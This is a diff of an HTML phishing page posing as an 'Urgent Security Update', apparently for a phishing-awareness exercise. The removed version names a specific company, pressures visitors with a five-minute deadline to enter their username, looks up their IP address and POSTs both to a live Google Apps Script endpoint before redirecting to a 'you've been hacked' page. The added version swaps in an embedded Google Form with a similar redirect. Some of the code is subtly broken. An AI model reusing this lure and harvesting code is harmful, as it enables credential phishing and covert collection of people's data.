@@ -1,45 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Urgent Security Update - Chesmi Consolidated</title> </head>
+  <title>Urgent Security Update - [Your Company Name]</title>
+</head>
 <body>
-  <h1>Important Security Announcement for Chesmi Team </h1>
-  <p>Please verify your username to view this critical security update regarding your account.</p>
-  <p>This announcement will only be available for the next 5 minutes. Please enter your username immediately.</p> 
-
-  <input type="text" id="username-input" placeholder="Username">
-  <button onclick="redirectToHackedPage()">Submit</button>
+  <iframe 
+    src="https://docs.google.com/forms/d/e/1FAIpQLSefGtcLuAZIhVcZ4Kr6EaVoooA-jFbeDqvlecpB8capioBTFw/viewform?embedded=true" 
+    width="640" 
+    height="669" 
+    frameborder="0" 
+    marginheight="0" 
+    marginwidth="0"
+    onload="setupRedirect()"
+  >Loading…</iframe>
 
   <script>
-    function redirectToHackedPage() {
-      var username = document.getElementById('username-input').value;
+    function setupRedirect() {
+      // Find the form within the iframe
+      var iframe = document.querySelector('iframe');
+      var form = iframe.contentWindow.document.querySelector('form');
 
-      // Get the IP address (this might not be accurate due to public IP)
-      var ipAddress = "unknown";
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          ipAddress = data.ip;
-        })
-        .catch(error => {
-          console.error("Error fetching IP address:", error);
-        })
-        .finally(() => {
-          // Send the data to the Google Sheet
-          fetch('https://script.google.com/macros/s/AKfycbytYsqKP0cavMdz1yfVtQGR74Ua_QKMXp0cSZs5Qe4-OLNwccATPnZI1XvB4PXxJdXH/exec'), {
-            method: 'POST',
-            body: new URLSearchParams({
-              ip: ipAddress,
-              username: username
-            })
-          })
-          .then(response => response.text())
-          .then(data => console.log(data))
-          .catch(error => console.error('Error sending data:', error));
-
-          // Redirect to the "You've been hacked" page
-          window.location.href = 'youve-been-hacked.html';
-        });
+      // Listen for the form's submit event
+      form.addEventListener('submit', function() {
+        // Redirect to the "You've been hacked" page after a short delay
+        setTimeout(function() {
+          window.top.location.href = 'youve-been-hacked.html';
+        }, 1000); // Adjust the delay as needed
+      });
     }
   </script>
 </body>
